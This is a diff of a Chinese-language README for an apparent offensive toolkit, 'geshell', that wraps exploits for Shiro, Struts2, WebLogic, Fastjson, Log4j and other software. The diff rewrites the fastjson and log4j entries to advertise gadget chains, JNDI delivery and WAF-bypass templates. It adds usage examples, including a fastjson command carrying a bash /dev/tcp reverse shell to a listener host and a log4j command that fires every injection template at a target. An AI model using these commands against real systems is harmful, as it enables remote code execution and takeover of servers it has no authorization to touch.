@@ -45,8 +45,8 @@ geshell <工具名> [参数...]
 | shiro | shiro | JAVA8 | exploit | Shiro 反序列化利用 v5.1.1 |
 | struts2 | struts2 | JAVA11 | exploit | Struts2 漏洞利用 v19.73 |
 | weblogic | weblogic | JAVA8 | exploit | WebLogic 漏洞利用 v1.3 |
-| fastjson | fastjson | JAVA11 | exploit | Fastjson 反序列化利用 |
-| log4j | log4j | JAVA11 | exploit | Log4j2 RCE 利用 |
+| fastjson | fastjson | Python | exploit | fastjson 反序列化利用（多种 @type gadget 链 + 绕过写法，经 JNDI 投递 |
+| log4j | log4j | Python | exploit | Log4j2 JNDI 注入利用（16 个常见注入点 + 多种 WAF 绕过模板） |
 | thinkphp | thinkphp | JAVA8 | exploit | ThinkPHP 漏洞利用 GUI |
 | nacos | nacos | JAVA11 | exploit | Nacos 漏洞利用 v3.0.5 |
 | jenkins | jenkins | JAVA8 | exploit | Jenkins 漏洞利用 GUI |
@@ -290,17 +290,19 @@ geshell <工具名> [参数...]
 
 ### fastjson（fastjson）
 
-- 说明：Fastjson 反序列化利用
+- 说明：fastjson 反序列化利用（多种 @type gadget 链 + 绕过写法，经 JNDI 投递）
 - 风险：exploit
 - 参数模式：passthrough
 - 别名：fastjson漏洞
+- 示例：`geshell fastjson -u http://target/api --serve --lhost 10.0.0.5 --cmd 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'`
 
 ### log4j（log4j）
 
-- 说明：Log4j2 RCE 利用
+- 说明：Log4j2 JNDI 注入利用（16 个常见注入点 + 多种 WAF 绕过模板）
 - 风险：exploit
 - 参数模式：passthrough
 - 别名：log4shell, log4j2
+- 示例：`geshell log4j -u http://target/ --serve --lhost 10.0.0.5 --all-templates`
 
 ### thinkphp（thinkphp）
 
